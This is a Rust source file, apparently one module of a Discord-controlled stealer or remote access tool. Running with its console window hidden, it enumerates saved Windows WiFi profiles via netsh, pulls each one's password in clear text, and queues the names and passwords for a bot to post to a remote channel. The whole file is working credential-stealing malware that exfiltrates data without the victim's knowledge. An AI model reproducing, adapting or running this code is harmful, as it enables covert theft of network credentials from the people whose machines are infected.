use std::os::windows::process::CommandExt;
use serde_json::json;
use crate::BOT_TO_SEND;
pub async fn main(channel_id: u64) {
    let wlan_proc= std::process::Command::new("netsh").creation_flags(0x08000000)
        .args(["wlan", "show", "profile"]).output().unwrap();
    let wlan_output= String::from_utf8_lossy(&wlan_proc.stdout);
    let mut chunk= String::new();
    for textline in wlan_output.split('\n').collect::<Vec<&str>>() {
        let textline= textline.trim_end();
        if textline.contains(": ") {
            let network_name= textline[textline.find(':').unwrap() + 2..].trim();
            let wlan_net= std::process::Command::new("netsh").creation_flags(0x08000000)
                .args(["wlan", "show", "profile", &("\"".to_owned() + network_name + "\""), "key=clear"])
                .output().unwrap();
            let wlan_netout= String::from_utf8_lossy(&wlan_net.stdout);
            for netline in wlan_netout.split('\n').collect::<Vec<&str>>() {
                if netline.contains("Key Content") {
                    let network_pass= netline[netline.find(':').unwrap() + 2..].trim();
                    let network= format!("WIFI Name: {}\n    WIFI Password: {}", network_name, network_pass);
                    if chunk.len() + network.len()> 1990 {
                        BOT_TO_SEND.lock().await.push(json!({
                            "channel": channel_id,
                            "content": format!("```{}```", chunk),
                            "react": ["📌"]
                        }));
                        chunk= network.to_owned() + "\n";
                    }else{
                        chunk+= &(network.to_owned() + "\n");
                    }
                }
            }
        }
    }
    if !chunk.is_empty() {
        BOT_TO_SEND.lock().await.push(json!({
            "channel": channel_id,
            "content": format!("```{}```", chunk),
            "react": ["📌"]
        }));
    }
}